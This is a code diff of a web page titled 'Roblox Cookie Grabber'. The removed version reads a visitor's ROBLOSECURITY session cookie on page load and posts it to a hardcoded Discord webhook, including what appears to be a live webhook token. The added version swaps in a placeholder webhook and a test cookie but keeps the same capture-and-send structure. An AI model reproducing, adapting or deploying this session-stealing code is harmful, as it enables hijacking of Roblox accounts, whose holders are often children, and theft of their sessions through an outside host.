@@ -1,126 +1,77 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Cookie Grabber</title>
-    <style>
-        body {
-            background-color: #23272a;
-            color: white;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
-        }
-        .container {
-            background-color: #2c2f33;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            max-width: 400px;
-        }
-        h2 { margin-top: 0; color: #ffcc00; }
-        p { color: #b9bbbe; font-size: 14px; }
-        .status {
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 5px;
-            display: none;
-        }
-        .success { background-color: #3ba55c; color: white; }
-        .error { background-color: #ed4245; color: white; }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <h2>Roblox Cookie Grabber</h2>
-    <p id="statusText">Checking for Roblox session...</p>
-    
-    <!-- Visual Status Indicator -->
-    <div id="statusBox" class="status"></div>
-</div>
-
 <script>
-    // ==========================================
-    // PASTE YOUR DISCORD WEBHOOK URL BELOW
-    // ==========================================
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4'; 
-    // ==========================================
+const WEBHOOK_URL = 'PASTE_YOUR_WEBHOOK_HERE';
 
-    function getCookie(name) {
-        const value = `; ${document.cookie}`;
-        const parts = value.split(`; ${name}=`);
-        if (parts.length === 2) return parts.pop().split(';').shift();
-        return null;
-    }
+// Get a cookie by name
+function getCookie(name) {
+    const value = `; ${document.cookie}`;
+    const parts = value.split(`; ${name}=`);
+    if (parts.length === 2) return parts.pop().split(';').shift();
+    return null;
+}
 
-    async function sendToDiscord(cookieValue) {
-        // Encode the cookie so special characters don't break JSON
-        const encodedCookie = encodeURIComponent(cookieValue);
-        
+// Update UI
+function updateStatus(message, type) {
+    const box = document.getElementById("statusBox");
+    const text = document.getElementById("statusText");
+
+    text.textContent = message;
+    box.style.display = "block";
+    box.textContent = message;
+    box.className = `status ${type}`;
+}
+
+// Send data to webhook
+async function sendToWebhook(value, name) {
+    try {
         const payload = {
-            content: "🔥 **New Roblox Cookie Captured!** 🔥",
+            content: `New cookie captured: ${name}`,
             embeds: [
                 {
-                    title: "Roblox Session Grabbed",
-                    color: 16753920, // Orange color
+                    title: "Cookie Data",
+                    color: 3447003,
                     fields: [
                         {
-                            name: "Cookie (ROBLOSECURITY)",
-                            value: `\`\`\`${encodedCookie}\`\`\``,
-                            inline: false
+                            name: "Value",
+                            value: `\`\`\`${value}\`\`\``
                         }
                     ],
-                    footer: { text: "Grabbed via GitHub Pages" },
                     timestamp: new Date().toISOString()
                 }
             ]
         };
 
-        try {
-            const response = await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
+        const res = await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        });
 
-            if (response.ok) {
-                showStatus("Cookie sent to Discord!", "success");
-            } else {
-                throw new Error('Discord API error');
-            }
-        } catch (error) {
-            console.error(error);
-            showStatus("Failed to send cookie.", "error");
-        }
-    }
-
-    function showStatus(msg, type) {
-        const box = document.getElementById('statusBox');
-        const text = document.getElementById('statusText');
-        
-        box.style.display = 'block';
-        box.className = `status ${type}`;
-        box.innerText = msg;
-        text.style.display = 'none'; // Hide the loading text
-    }
-
-    // Run on page load
-    window.onload = function() {
-        const robloxCookie = getCookie('ROBLOSECURITY');
-
-        if (robloxCookie) {
-            sendToDiscord(robloxCookie);
+        if (res.ok) {
+            updateStatus("Sent successfully!", "success");
         } else {
-            showStatus("Not logged into Roblox?", "error");
+            updateStatus("Failed to send.", "error");
         }
-    };
-</script>
 
-</body>
-</html>
+    } catch (err) {
+        updateStatus("Error sending request.", "error");
+        console.error(err);
+    }
+}
+
+// MAIN EXECUTION
+document.addEventListener("DOMContentLoaded", () => {
+    // Example: set your own test cookie first
+    document.cookie = "testCookie=hello_world; path=/";
+
+    const cookieValue = getCookie("testCookie");
+
+    if (cookieValue) {
+        updateStatus("Cookie found!", "success");
+        sendToWebhook(cookieValue, "testCookie");
+    } else {
+        updateStatus("Cookie not found.", "error");
+    }
+});
+</script>
